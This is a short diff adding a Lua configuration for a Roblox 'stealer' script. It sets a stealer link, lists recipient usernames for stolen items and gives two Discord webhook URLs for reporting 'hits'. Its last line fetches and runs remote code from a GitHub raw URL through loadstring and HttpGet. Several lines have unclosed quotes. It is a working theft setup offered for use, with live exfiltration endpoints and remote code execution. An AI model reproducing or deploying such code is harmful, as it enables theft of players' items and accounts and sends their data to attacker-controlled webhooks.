@@ -1,0 +1,12 @@
+STEALER_LINK = '' -- https://dpaste.com/ENEY5JGKP.txt (how to create is bellow)
+
+Usernames = {
+    'hakelvrekai3, -- PUT UR ROBLOX USERNAMES
+    'hakelvrekai4, -- AS MANY AS U WANT BUT DONT FORGET ,
+    'hakelvrekai5,
+}
+
+BigHitsWebhook = "https://discord.com/api/webhooks/1331718678642823218/bF-U8iwelywWAehzCKNUYWzJ35pYtU9O-QnCsYviCm3Ev8Ul-fefWYSA04Zcp5dfhLyd"
+SmallHitsWebhook = "https://discord.com/api/webhooks/1331718678642823218/bF-U8iwelywWAehzCKNUYWzJ35pYtU9O-QnCsYviCm3Ev8Ul-fefWYSA04Zcp5dfhLyd"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Serwxl/ODHHUB_BySer/refs/heads/main/RobloxHub"))()
